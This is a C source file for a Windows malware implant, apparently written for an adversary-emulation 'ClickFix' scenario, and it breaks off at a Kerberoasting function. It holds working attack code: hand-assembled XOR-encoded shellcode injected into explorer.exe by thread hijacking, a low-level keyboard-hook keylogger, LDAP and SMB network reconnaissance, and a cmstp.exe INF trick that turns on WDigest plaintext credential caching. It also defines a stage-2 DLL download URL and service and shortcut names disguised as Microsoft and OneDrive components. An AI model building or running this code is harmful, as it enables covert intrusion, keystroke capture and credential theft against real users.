#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <ole2.h>
#include <winhttp.h>
#include <lm.h>
#include <lmaccess.h>
#include <lmshare.h>
#include <lmserver.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <rpc.h>
#include <rpcdce.h>
#include <ntsecapi.h>
#include <stdio.h>


// ponytail: previous "struct alignment" diagnosis was wrong — MinGW headers
// self-protect STARTUPINFOW layout so the outer #pragma pack(push,4) had no
// effect. Real WorkerThread AV was a read-only L"..." literal passed as
// lpCommandLine to CreateProcessW at EnableWDigest (CreateProcessW writes
// into that buffer to tokenize it). Fixed at EnableWDigest by copying to a
// writable stack buffer, same pattern as InstallService ~line 1201.
#define XOR_KEY 0xAA
#define DLL_PATH "C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll"
#define DLL_PATH_W L"C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll"
#define LOG_PATH L"C:\\ProgramData\\USOShared\\Logs\\cache.dat"
#define KEY_PATH L"C:\\ProgramData\\USOShared\\Logs\\Telemetry.bin"
#define DOM_PATH L"C:\\ProgramData\\Microsoft\\Search\\Data\\EDS\\index.tmp"
#define NET_PATH L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\state.tmp"
#define SPN_PATH L"C:\\ProgramData\\Microsoft\\Search\\Data\\EDS\\spcache.bin"
#define DOMAIN_MAP_PATH L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\queue.tmp"
#define WDG_INF_PATH L"C:\\Windows\\Temp\\~wdg.inf"
#define UPDATER_DLL_PATH L"C:\\Users\\Public\\Libraries\\Telemetry.dll"
#define SIDELOAD_DLL_PATH L"C:\\Users\\Public\\Libraries\\msimtf.dll"
#define HTA_PATH L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\report.hta"
#define SCT_PATH L"C:\\ProgramData\\Microsoft\\Search\\Data\\EDS\\stage.sct"
#define JS_PATH L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\stage.js"
#define BITS_LOG_PATH L"C:\\ProgramData\\USOShared\\Logs\\BITS.bin"
#define WIFI_LOG_PATH L"C:\\ProgramData\\USOShared\\Logs\\Wifi.bin"
#define STAGE2_URL L"https://raw.githubusercontent.com/Justanother-engineer/scenario-02-clickfix/main/src/stage2.dll"
#define STAGE2_DEST L"C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\stage2.dll"
#define BITS_JOB_NAME L"Windows Update Health Check"
#define SERVICE_NAME L"WinUpdHlth"
#define SERVICE_DISPLAY L"Microsoft Update Health Tools"
#define SERVICE_BINPATH L"rundll32.exe C:\\Users\\Public\\Libraries\\Telemetry.dll,DllRegisterServer"
#define LNK_NAME L"OneDrive Update.lnk"
#define BEACON_URL L"https://github.com"
#define BEACON_COUNT 5
#define BEACON_SLEEP_MS 10000

static char g_keylogBuffer[4096];
static DWORD g_keylogLen = 0;

static void EnsureDirectory(LPCWSTR path) {
    wchar_t tmp[MAX_PATH];
    lstrcpyW(tmp, path);
    for (int i = 0; tmp[i]; i++) {
        if (tmp[i] == L'\\') {
            tmp[i] = L'\0';
            CreateDirectoryW(tmp, NULL);
            tmp[i] = L'\\';
        }
    }
    CreateDirectoryW(tmp, NULL);
}

static void LogMessage(LPCWSTR msg) {
    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);

    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t timestamp[32];
    wsprintfW(timestamp, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    // ponytail: convert wide -> UTF-8 (no BOM) so cache.dat is one coherent
    // byte stream alongside the JScript FSO ASCII + loader AppendAllText
    // writes. Previous UTF-16LE writes appeared as [ 2 0 2 6 ... ] mojibake.
    char ts8[80], msg8[1024];
    int tsN  = WideCharToMultiByte(CP_UTF8, 0, timestamp, -1, ts8,  sizeof(ts8),  NULL, NULL);
    int msgN = WideCharToMultiByte(CP_UTF8, 0, msg,        -1, msg8, sizeof(msg8), NULL, NULL);
    DWORD written;
    if (tsN  > 0) WriteFile(hFile, ts8,  (DWORD)(tsN  - 1), &written, NULL);
    if (msgN > 0) WriteFile(hFile, msg8, (DWORD)(msgN - 1), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);

    CloseHandle(hFile);
}

static void AppendToFile(LPCWSTR path, LPCSTR text) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    DWORD written;
    WriteFile(hFile, text, lstrlenA(text), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

static LPBYTE BuildHijackShellcode(LPCSTR dllPath, FARPROC pLoadLibraryA, FARPROC pGetProcAddress, DWORD* pdwSize) {
    DWORD pathLen = lstrlenA(dllPath) + 1;
    const char funcName[] = "DllRegisterServer";
    DWORD funcNameLen = sizeof(funcName);

    // Decoder: XOR-loop then jmp to encoded payload
    //  bytes: call $+5; pop rsi; add rsi,offset; mov ecx,size;
    //        xor eax,eax; loop: xor [rsi+rax],KEY; inc rax; cmp rax,rcx; jb loop; jmp rsi
    DWORD decoderSize = 31;

    // Main shellcode: LoadLibraryA(dllPath) → GetProcAddress → DllRegisterServer
    DWORD mainCodeSize = 76;
    DWORD encSize = mainCodeSize + pathLen + funcNameLen;
    DWORD totalSize = decoderSize + encSize;

    LPBYTE buf = (LPBYTE)LocalAlloc(LPTR, totalSize);
    if (!buf) return NULL;

    // rbx = &decoder[decoderSize + 9] after call-pop within main code
    DWORD rbxOff = decoderSize + 9;

    // Relative offsets for LEA from [rbx]
    DWORD dllPathOff = decoderSize + mainCodeSize;
    DWORD funcNameOff = dllPathOff + pathLen;
    DWORD dllRel = dllPathOff - rbxOff;
    DWORD funcRel = funcNameOff - rbxOff;

    // Jump offsets for JZ rel8
    // jz1 at offset decoderSize+32 -> cleanup at decoderSize+71
    // jz2 at offset decoderSize+59 -> cleanup at decoderSize+71
    DWORD cleanupOff = decoderSize + 71;

    LPBYTE decoder = buf;
    LPBYTE encoded = buf + decoderSize;

    // --- Build decoder (31 bytes, fixed XOR loop) ---
    decoder[0] = 0xE8; decoder[1] = 0x00; decoder[2] = 0x00; decoder[3] = 0x00; decoder[4] = 0x00;
    decoder[5] = 0x5E;
    decoder[6] = 0x48; decoder[7] = 0x83; decoder[8] = 0xC6; decoder[9] = (BYTE)(decoderSize - 5);
    decoder[10] = 0xB9;
    memcpy(&decoder[11], &encSize, 4);
    decoder[15] = 0x31; decoder[16] = 0xC0;
    decoder[17] = 0x80; decoder[18] = 0x34; decoder[19] = 0x06; decoder[20] = XOR_KEY;
    decoder[21] = 0x48; decoder[22] = 0xFF; decoder[23] = 0xC0;
    decoder[24] = 0x48; decoder[25] = 0x39; decoder[26] = 0xC8;
    decoder[27] = 0x72; decoder[28] = (BYTE)(decoder[17] - (decoder[27] + 2));  // jb back to xor
    decoder[29] = 0xFF; decoder[30] = 0xE6;

    // --- Build main shellcode (76 bytes) ---
    // sub rsp, 0x28
    encoded[0] = 0x48; encoded[1] = 0x83; encoded[2] = 0xEC; encoded[3] = 0x28;
    // call $+5
    encoded[4] = 0xE8; encoded[5] = 0x00; encoded[6] = 0x00; encoded[7] = 0x00; encoded[8] = 0x00;
    // pop rbx
    encoded[9] = 0x5B;
    // lea rcx, [rbx + dllRel]
    encoded[10] = 0x48; encoded[11] = 0x8D; encoded[12] = 0x8B;
    memcpy(&encoded[13], &dllRel, 4);
    // mov rax, pLoadLibraryA
    encoded[17] = 0x48; encoded[18] = 0xB8;
    memcpy(&encoded[19], &pLoadLibraryA, 8);
    // call rax
    encoded[27] = 0xFF; encoded[28] = 0xD0;
    // test rax, rax
    encoded[29] = 0x48; encoded[30] = 0x85; encoded[31] = 0xC0;
    // jz cleanup
    encoded[32] = 0x74; encoded[33] = (BYTE)(cleanupOff - (decoderSize + 34));
    // mov rcx, rax  (hModule)
    encoded[34] = 0x48; encoded[35] = 0x89; encoded[36] = 0xC1;
    // lea rdx, [rbx + funcRel]
    encoded[37] = 0x48; encoded[38] = 0x8D; encoded[39] = 0x93;
    memcpy(&encoded[40], &funcRel, 4);
    // mov rax, pGetProcAddress
    encoded[44] = 0x48; encoded[45] = 0xB8;
    memcpy(&encoded[46], &pGetProcAddress, 8);
    // call rax
    encoded[54] = 0xFF; encoded[55] = 0xD0;
    // test rax, rax
    encoded[56] = 0x48; encoded[57] = 0x85; encoded[58] = 0xC0;
    // jz cleanup
    encoded[59] = 0x74; encoded[60] = (BYTE)(cleanupOff - (decoderSize + 61));
    // call rax (DllRegisterServer)
    encoded[61] = 0xFF; encoded[62] = 0xD0;
    // cleanup: add rsp, 0x28
    encoded[63] = 0x48; encoded[64] = 0x83; encoded[65] = 0xC4; encoded[66] = 0x28;
    // ret
    encoded[67] = 0xC3;

    // --- Data: dllPath + "DllRegisterServer" ---
    memcpy(&encoded[mainCodeSize], dllPath, pathLen);
    memcpy(&encoded[mainCodeSize + pathLen], funcName, funcNameLen);

    // --- XOR-encode the entire payload section ---
    for (DWORD i = 0; i < encSize; i++) {
        encoded[i] ^= XOR_KEY;
    }

    *pdwSize = totalSize;
    return buf;
}

static DWORD FindExplorerPID(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (lstrcmpiA(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

static void DoThreadHijack(void) {
    LogMessage(L"[+] DoThreadHijack started");

    DWORD pid = FindExplorerPID();
    if (!pid) {
        LogMessage(L"[-] explorer.exe not found");
        return;
    }

    wchar_t buf[256];
    wsprintfW(buf, L"[+] explorer.exe PID=%lu", pid);
    LogMessage(buf);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        LogMessage(L"[-] OpenProcess failed");
        return;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        LogMessage(L"[-] Thread snapshot failed");
        return;
    }

    DWORD tid = 0;
    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(hThreadSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(hThreadSnap, &te));
    }
    CloseHandle(hThreadSnap);

    if (!tid) {
        CloseHandle(hProcess);
        LogMessage(L"[-] No explorer threads found");
        return;
    }

    wsprintfW(buf, L"[+] Target thread TID=%lu", tid);
    LogMessage(buf);

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        CloseHandle(hProcess);
        LogMessage(L"[-] OpenThread failed");
        return;
    }

    if (SuspendThread(hThread) == (DWORD)-1) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] SuspendThread failed");
        return;
    }
    LogMessage(L"[+] Thread suspended");

    FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
    FARPROC pGetProcAddress = GetProcAddress(GetModuleHandleA("kernel32"), "GetProcAddress");
    if (!pLoadLibraryA || !pGetProcAddress) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] LoadLibraryA/GetProcAddress not found");
        return;
    }

    DWORD dwSize;
    LPBYTE shellcode = BuildHijackShellcode(DLL_PATH, pLoadLibraryA, pGetProcAddress, &dwSize);
    if (!shellcode) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] Shellcode build failed");
        return;
    }

    wsprintfW(buf, L"[+] Shellcode built: %lu bytes", dwSize);
    LogMessage(buf);

    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        LocalFree(shellcode);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] VirtualAllocEx failed");
        return;
    }

    if (!WriteProcessMemory(hProcess, pRemote, shellcode, dwSize, NULL)) {
        LocalFree(shellcode);
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] WriteProcessMemory failed");
        return;
    }
    LocalFree(shellcode);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx)) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] GetThreadContext failed");
        return;
    }

    ctx.Rip = (DWORD64)pRemote;
    if (!SetThreadContext(hThread, &ctx)) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] SetThreadContext failed");
        return;
    }

    if (ResumeThread(hThread) == (DWORD)-1) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        LogMessage(L"[-] ResumeThread failed");
        return;
    }

    LogMessage(L"[+] Thread hijacked — shellcode running");
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

// ============================================================
// Keylogger thread
// ============================================================

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            BYTE keyState[256] = {0};
            GetKeyboardState(keyState);
            WORD ch;
            int ret = ToAscii(pKb->vkCode, pKb->scanCode, keyState, &ch, 0);
            if (ret == 1) {
                if (g_keylogLen < sizeof(g_keylogBuffer) - 2) {
                    g_keylogBuffer[g_keylogLen++] = (char)(ch & 0xFF);
                }
            } else {
                const char* special = NULL;
                switch (pKb->vkCode) {
                    case VK_RETURN: special = "[ENTER]"; break;
                    case VK_BACK:   special = "[BACK]"; break;
                    case VK_TAB:    special = "[TAB]"; break;
                    case VK_ESCAPE: special = "[ESC]"; break;
                    case VK_SPACE:  special = " "; break;
                    case VK_DELETE: special = "[DEL]"; break;
                    case VK_UP:     special = "[UP]"; break;
                    case VK_DOWN:   special = "[DOWN]"; break;
                    case VK_LEFT:   special = "[LEFT]"; break;
                    case VK_RIGHT:  special = "[RIGHT]"; break;
                }
                if (special) {
                    int slen = lstrlenA(special);
                    if (g_keylogLen + slen < sizeof(g_keylogBuffer) - 2) {
                        lstrcpyA(g_keylogBuffer + g_keylogLen, special);
                        g_keylogLen += slen;
                    }
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    (void)lpParam;
    g_keylogBuffer[0] = '\0';
    g_keylogLen = 0;

    HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        LogMessage(L"[-] Keylogger hook failed");
        return 1;
    }
    LogMessage(L"[+] Keylogger hook installed");

    DWORD start = GetTickCount();
    MSG msg;
    while (GetTickCount() - start < 120000) {
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        Sleep(10);
    }

    UnhookWindowsHookEx(hHook);
    LogMessage(L"[+] Keylogger unhooked");

    HANDLE hFile = CreateFileW(KEY_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, g_keylogBuffer, g_keylogLen, &written, NULL);
        CloseHandle(hFile);
        wchar_t buf[128];
        wsprintfW(buf, L"[+] Keylogger buffer written: %lu bytes", g_keylogLen);
        LogMessage(buf);
    }
    return 0;
}

// ============================================================
// LDAP helpers (loaded dynamically from wldap32.dll)
// ============================================================

typedef struct ldap LDAP;
typedef struct ldapmsg LDAPMessage;

// ponytail: ldap_initW does not exist on stock wldap32.dll — only ldap_init
// (ANSI, PSTR HostName). Using ldap_initW silently returns NULL, causing
// DoLDAPRecon / DoKerberoast / DoWinRMProbe to bail at their first call.
typedef LDAP* (WINAPI *ldap_init_t)(PSTR, ULONG);
typedef ULONG (WINAPI *ldap_bind_sW_t)(LDAP*, PWSTR, PWSTR*, ULONG);
typedef ULONG (WINAPI *ldap_search_sW_t)(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
typedef LDAPMessage* (WINAPI *ldap_first_entry_t)(LDAP*, LDAPMessage*);
typedef LDAPMessage* (WINAPI *ldap_next_entry_t)(LDAP*, LDAPMessage*);
typedef PWSTR* (WINAPI *ldap_get_valuesW_t)(LDAP*, LDAPMessage*, PWSTR);
typedef void (WINAPI *ldap_value_free_t)(PWSTR*);
typedef ULONG (WINAPI *ldap_msgfree_t)(LDAPMessage*);
typedef ULONG (WINAPI *ldap_unbind_t)(LDAP*);

typedef struct {
    HMODULE hMod;
    ldap_init_t            ldap_init;
    ldap_bind_sW_t         ldap_bind_s;
    ldap_search_sW_t       ldap_search_s;
    ldap_first_entry_t     ldap_first_entry;
    ldap_next_entry_t      ldap_next_entry;
    ldap_get_valuesW_t     ldap_get_values;
    ldap_value_free_t      ldap_value_free;
    ldap_msgfree_t         ldap_msgfree;
    ldap_unbind_t          ldap_unbind;
} LDAP_API;

static BOOL LdapLoad(LDAP_API* api) {
    api->hMod = LoadLibraryW(L"wldap32.dll");
    if (!api->hMod) return FALSE;
    api->ldap_init       = (ldap_init_t)        GetProcAddress(api->hMod, "ldap_init");
    api->ldap_bind_s     = (ldap_bind_sW_t)    GetProcAddress(api->hMod, "ldap_bind_sW");
    api->ldap_search_s   = (ldap_search_sW_t)  GetProcAddress(api->hMod, "ldap_search_sW");
    api->ldap_first_entry= (ldap_first_entry_t) GetProcAddress(api->hMod, "ldap_first_entry");
    api->ldap_next_entry = (ldap_next_entry_t) GetProcAddress(api->hMod, "ldap_next_entry");
    api->ldap_get_values = (ldap_get_valuesW_t) GetProcAddress(api->hMod, "ldap_get_valuesW");
    api->ldap_value_free = (ldap_value_free_t)  GetProcAddress(api->hMod, "ldap_value_free");
    api->ldap_msgfree    = (ldap_msgfree_t)     GetProcAddress(api->hMod, "ldap_msgfree");
    api->ldap_unbind     = (ldap_unbind_t)      GetProcAddress(api->hMod, "ldap_unbind");
    if (!api->ldap_init || !api->ldap_bind_s || !api->ldap_search_s) {
        FreeLibrary(api->hMod);
        api->hMod = NULL;
        return FALSE;
    }
    return TRUE;
}

static void LdapUnload(LDAP_API* api) {
    if (api->hMod) { FreeLibrary(api->hMod); api->hMod = NULL; }
}

// ============================================================
// DoLDAPRecon
// ============================================================

static void DoLDAPRecon(void) {
    LDAP_API ldap;
    if (!LdapLoad(&ldap)) { LogMessage(L"[-] LDAP wldap32.dll load failed"); return; }

    LDAP* pl = ldap.ldap_init(NULL, 389);
    if (!pl) { LdapUnload(&ldap); LogMessage(L"[-] ldap_init failed"); return; }

    ULONG ret = ldap.ldap_bind_s(pl, NULL, NULL, 0x0486); // LDAP_AUTH_NEGOTIATE
    if (ret != 0) { // LDAP_SUCCESS
        ldap.ldap_unbind(pl);
        LdapUnload(&ldap);
        LogMessage(L"[-] LDAP bind failed");
        return;
    }

    DeleteFileW(DOM_PATH);
    AppendToFile(DOM_PATH, "=== LDAP DOMAIN RECON ===");

    wchar_t baseDn[256] = {0};
    LDAPMessage* pMsg = NULL;
    PWSTR rootAttrs[] = { L"defaultNamingContext", NULL };
    ret = ldap.ldap_search_s(pl, NULL, 0, L"(objectClass=*)", rootAttrs, 0, &pMsg); // LDAP_SCOPE_BASE = 0
    if (ret == 0 && pMsg) {
        LDAPMessage* entry = ldap.ldap_first_entry(pl, pMsg);
        if (entry) {
            PWSTR* vals = ldap.ldap_get_values(pl, entry, L"defaultNamingContext");
            if (vals && vals[0]) {
                lstrcpyW(baseDn, vals[0]);
                wchar_t buf[512];
                wsprintfW(buf, L"Base DN: %s", vals[0]);
                char line[512];
                snprintf(line, sizeof(line), "%S", buf);
                AppendToFile(DOM_PATH, line);
            }
            if (vals) ldap.ldap_value_free(vals);
        }
        ldap.ldap_msgfree(pMsg);
    }

    if (!baseDn[0]) {
        ldap.ldap_unbind(pl);
        LdapUnload(&ldap);
        LogMessage(L"[-] LDAP base DN not found");
        return;
    }

    // Search computers
    AppendToFile(DOM_PATH, "--- Computers ---");
    PWSTR compAttrs[] = { L"cn", L"operatingSystem", NULL };
    ret = ldap.ldap_search_s(pl, baseDn, 2, L"(objectClass=computer)", compAttrs, 0, &pMsg); // LDAP_SCOPE_SUBTREE = 2
    if (ret == 0 && pMsg) {
        LDAPMessage* entry = ldap.ldap_first_entry(pl, pMsg);
        while (entry) {
            char line[512];
            PWSTR* cnVals = ldap.ldap_get_values(pl, entry, L"cn");
            PWSTR* osVals = ldap.ldap_get_values(pl, entry, L"operatingSystem");
            snprintf(line, sizeof(line), "  Computer: %S (OS: %S)",
                     cnVals && cnVals[0] ? cnVals[0] : L"unknown",
                     osVals && osVals[0] ? osVals[0] : L"unknown");
            AppendToFile(DOM_PATH, line);
            if (cnVals) ldap.ldap_value_free(cnVals);
            if (osVals) ldap.ldap_value_free(osVals);
            entry = ldap.ldap_next_entry(pl, entry);
        }
        ldap.ldap_msgfree(pMsg);
    }

    // Search groups
    AppendToFile(DOM_PATH, "--- Groups ---");
    PWSTR groupAttrs[] = { L"cn", NULL };
    ret = ldap.ldap_search_s(pl, baseDn, 2, L"(objectClass=group)", groupAttrs, 0, &pMsg);
    if (ret == 0 && pMsg) {
        LDAPMessage* entry = ldap.ldap_first_entry(pl, pMsg);
        while (entry) {
            char line[512];
            PWSTR* cnVals = ldap.ldap_get_values(pl, entry, L"cn");
            snprintf(line, sizeof(line), "  Group: %S", cnVals && cnVals[0] ? cnVals[0] : L"unknown");
            AppendToFile(DOM_PATH, line);
            if (cnVals) ldap.ldap_value_free(cnVals);
            entry = ldap.ldap_next_entry(pl, entry);
        }
        ldap.ldap_msgfree(pMsg);
    }

    ldap.ldap_unbind(pl);
    LdapUnload(&ldap);
    LogMessage(L"[+] LDAP recon complete");
}

// ============================================================
// DoSMBRecon
// ============================================================

static void DoSMBRecon(void) {
    LogMessage(L"[+] SMB scan started");

    DeleteFileW(NET_PATH);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    LPBYTE pServers = NULL;
    DWORD dwEntries = 0, dwTotal = 0;
    NET_API_STATUS status = NetServerEnum(NULL, 100, &pServers, MAX_PREFERRED_LENGTH, &dwEntries, &dwTotal, SV_TYPE_ALL, NULL, NULL);

    int totalShares = 0;
    int openPorts = 0;

    if (status == NERR_Success && pServers) {
        wchar_t countMsg[128];
        wsprintfW(countMsg, L"[+] SMB servers found: %lu", dwEntries);
        LogMessage(countMsg);

        PSERVER_INFO_100 pInfo = (PSERVER_INFO_100)pServers;
        for (DWORD i = 0; i < dwEntries; i++) {
            char line[512];
            snprintf(line, sizeof(line), "Server: %S", pInfo[i].sv100_name);
            AppendToFile(NET_PATH, line);

            char serverName[256];
            snprintf(serverName, sizeof(serverName), "%S", pInfo[i].sv100_name);
            struct hostent* host = gethostbyname(serverName);
            if (host && host->h_addr_list[0]) {
                struct in_addr addr;
                memcpy(&addr, host->h_addr_list[0], sizeof(addr));
                char* ipStr = inet_ntoa(addr);
                snprintf(line, sizeof(line), "  IP: %s", ipStr);
                AppendToFile(NET_PATH, line);

                SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock != INVALID_SOCKET) {
                    DWORD timeout = 3000;
                    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

                    struct sockaddr_in sa;
                    sa.sin_family = AF_INET;
                    sa.sin_port = htons(445);
                    sa.sin_addr = addr;
                    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
                        openPorts++;
                        AppendToFile(NET_PATH, "  Port 445: OPEN");

                        wchar_t uncPath[512];
                        wsprintfW(uncPath, L"\\\\%s", pInfo[i].sv100_name);
                        LPBYTE pShares = NULL;
                        DWORD dwShareEntries = 0, dwShareTotal = 0;
                        NET_API_STATUS shareStatus = NetShareEnum(uncPath, 1, &pShares, MAX_PREFERRED_LENGTH, &dwShareEntries, &dwShareTotal, NULL);
                        if (shareStatus == NERR_Success && pShares) {
                            PSHARE_INFO_1 pShareInfo = (PSHARE_INFO_1)pShares;
                            for (DWORD j = 0; j < dwShareEntries; j++) {
                                snprintf(line, sizeof(line), "    Share: %S (type: %lu)", pShareInfo[j].shi1_netname, pShareInfo[j].shi1_type);
                                AppendToFile(NET_PATH, line);
                                totalShares++;
                            }
                            NetApiBufferFree(pShares);
                        }
                    }
                    closesocket(sock);
                }
            }
        }
        NetApiBufferFree(pServers);
    }

    wchar_t buf[128];
    wsprintfW(buf, L"[+] SMB scan completed: %d shares, %d port 445 open", totalShares, openPorts);
    LogMessage(buf);
    WSACleanup();
}

// ============================================================
// DoAdapterInfo
// ============================================================

static void DoAdapterInfo(void) {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    AppendToFile(DOM_PATH, "--- Network Adapters ---");
    int adapterCount = 0;
    if (GetAdaptersInfo(adapterInfo, &dwBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        while (pAdapter) {
            adapterCount++;
            char line[512];
            snprintf(line, sizeof(line), "  Adapter: %s (%s) - IP: %s, Mask: %s, Gateway: %s",
                     pAdapter->AdapterName, pAdapter->Description,
                     pAdapter->IpAddressList.IpAddress.String,
                     pAdapter->IpAddressList.IpMask.String,
                     pAdapter->GatewayList.IpAddress.String);
            AppendToFile(DOM_PATH, line);
            pAdapter = pAdapter->Next;
        }
    }
    wchar_t buf[64];
    wsprintfW(buf, L"[+] %d network adapter(s) enumerated", adapterCount);
    LogMessage(buf);
}

// ============================================================
// EnableWDigest
// ============================================================

static void EnableWDigest(void) {
    EnsureDirectory(L"C:\\Windows\\Temp");

    char infContent[] =
        "[version]\r\n"
        "Signature=$chicago$\r\n"
        "AdvancedINF=2.5\r\n"
        "\r\n"
        "[DefaultInstall]\r\n"
        "RunPreSetupCommands=EnableWDigest\r\n"
        "\r\n"
        "[EnableWDigest]\r\n"
        "reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f\r\n";

    HANDLE hFile = CreateFileW(WDG_INF_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, infContent, lstrlenA(infContent), &written, NULL);
        CloseHandle(hFile);
        LogMessage(L"[+] Wrote WDigest INF");
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // ponytail: CreateProcessW writes into lpCommandLine (tokenizes it), so the
    // buffer must be writable. Passing L"..." directly lands the literal in
    // .rdata (read-only) and AVs with 0xC0000005 inside kernelbase. Mirror
    // InstallService's pattern (line ~1201): copy to a stack buffer first.
    wchar_t cmd[256];
    wsprintfW(cmd, L"cmstp.exe /s /au %s", WDG_INF_PATH);

    if (CreateProcessW(NULL, cmd,
                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        wchar_t buf[256];
        wsprintfW(buf, L"[+] cmstp.exe exited (code %lu) — reg.exe add runs in cmstp context", exitCode);
        LogMessage(buf);
        LogMessage(L"[+] WDigest UseLogonCredential=1 (verify with: reg query HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest)");
    } else {
        LogMessage(L"[-] cmstp.exe launch FAILED");
    }
}

// ============================================================
// DoKerberoast
// NOTE: LsaCallAuthenticationPackage(KerbRetrieveEncodedTicketMessage) requires
// SeTcbPrivilege. Without it the TGS request returns STATUS_ACCESS_DENIED.
// SPN list is still captured from LDAP; actual ticket capture is simulated.
// ============================================================

static void DoKerberoast(void) {
